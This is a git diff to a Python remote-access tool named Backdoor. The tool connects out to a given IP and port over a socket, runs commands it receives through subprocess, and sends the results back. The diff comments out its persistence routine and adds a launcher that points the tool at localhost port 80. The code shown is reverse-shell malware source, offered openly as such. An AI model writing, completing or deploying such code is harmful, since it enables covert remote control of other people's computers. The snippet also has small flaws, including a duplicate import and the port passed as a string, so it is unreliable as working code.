@@ -5,6 +5,7 @@ import socket
 import subprocess
 import json
 import os
+import sys
 import base64
 import sys
 import shutil
@@ -16,7 +17,7 @@ import scapy.all as scapy
 
 class Backdoor():
     def __init__(self, ip, port):
-        self.persistence()
+#        self.persistence()
         self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.connection.connect((ip, port))
     def persistence(self):
@@ -135,3 +136,6 @@ class Backdoor():
                     cmd_rslt = "[-] Error During Command Execution.\n ERROR:\t{e}\t"
 
             self.cmd_send(cmd_rslt)
+if __name__ == "__main__":
+    app = Backdoor("127.0.0.1", "80")
+    app.run()
